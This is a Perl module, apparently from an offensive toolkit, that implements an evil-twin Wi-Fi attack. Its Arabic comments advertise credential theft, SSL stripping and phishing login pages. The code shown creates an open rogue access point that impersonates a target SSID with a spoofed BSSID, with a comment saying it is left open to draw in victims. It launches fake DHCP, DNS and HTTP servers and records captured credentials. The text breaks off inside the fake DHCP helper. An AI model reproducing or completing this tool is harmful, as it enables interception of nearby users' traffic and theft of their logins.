package attacks::EvilTwin;
# =============================================================================
# EvilTwin.pm - هجوم التوأم الشرير (Evil Twin Attack)
# =============================================================================
# الميزات: إنشاء نقطة وصول مزيفة، سرقة بيانات الاعتماد، SSL stripping، 
#          واجهة تسجيل دخول مزيفة، تحليل الحزم
# =============================================================================

use strict;
use warnings;
use parent 'Exporter';
our @EXPORT_OK = qw(evil_twin_create evil_twin_capture evil_twin_ssl_strip evil_twin_phishing_page);

use lib '.';
use lib::Utils;
use lib::Colors;
use IO::Socket::INET;
use IO::Socket::SSL;
use Net::DHCP::Packet;
use Net::DNS::Resolver;
use HTTP::Daemon;
use HTTP::Status;
use LWP::UserAgent;
use Time::HiRes qw(sleep time);
use File::Slurp qw(read_file write_file);
use JSON;

# =============================================================================
# إنشاء نقطة وصول Evil Twin
# =============================================================================
sub evil_twin_create {
    my ($target_ssid, $interface, $channel) = @_;
    
    my $color = Colors->new();
    my $utils = Utils->new();
    
    say "\n${\($color->quantum())}╔══════════════════════════════════════════════════════════════════╗${\($color->reset())}";
    say "${\($color->quantum())}║                    🎭 هجوم التوأم الشرير (Evil Twin) 🎭              ║${\($color->reset())}";
    say "${\($color->quantum())}╚══════════════════════════════════════════════════════════════════╝${\($color->reset())}";
    
    $target_ssid //= "Free_WiFi";
    $interface //= "wlan0";
    $channel //= 6;
    
    say "${\($color->info())}[*] إنشاء نقطة وصول مزيفة...${\($color->reset())}";
    say "   → SSID الهدف: $target_ssid";
    say "   → الواجهة: $interface";
    say "   → القناة: $channel";
    
    # إنشاء واجهة نقطة الوصول المزيفة
    my $ap_config = {
        ssid => $target_ssid,
        interface => $interface,
        channel => $channel,
        bssid => $utils->generate_mac(),
        encryption => 'open',  # مفتوحة لجذب الضحايا
        ip_range => '192.168.100.0/24',
        gateway => '192.168.100.1'
    };
    
    # بدء خادم DHCP مزيف
    my $dhcp_pid = _start_fake_dhcp($ap_config);
    
    # بدء خادم DNS مزيف
    my $dns_pid = _start_fake_dns($ap_config);
    
    # بدء خادم HTTP مزيف
    my $http_pid = _start_fake_http($ap_config);
    
    say "\n${\($color->success())}[✓] نقطة الوصول المزيفة تعمل الآن!${\($color->reset())}";
    say "   → SSID: $target_ssid (مفتوحة)";
    say "   → بوابة: $ap_config->{gateway}";
    say "   → BSSID: $ap_config->{bssid}";
    
    # حفظ معلومات الجلسة
    my $session = {
        start_time => time(),
        target_ssid => $target_ssid,
        ap_config => $ap_config,
        pids => {
            dhcp => $dhcp_pid,
            dns => $dns_pid,
            http => $http_pid
        },
        captured_credentials => []
    };
    
    # حفظ الجلسة للمراقبة
    write_file("/tmp/evil_twin_session.json", encode_json($session));
    
    return $session;
}

# =============================================================================
# بدء خادم DHCP مزيف
# =============================================================================
sub _start_fake_dhcp {
    my ($config) = @_;
    
    my $color = Colors->new();
    
    say "${\($color->info())}[*] بدء خادم DHCP مزيف...${\($color->reset())}";
    
    # في التطبيق الحقيقي، ستستخدم أداة مثل dnsmasq أو تكت
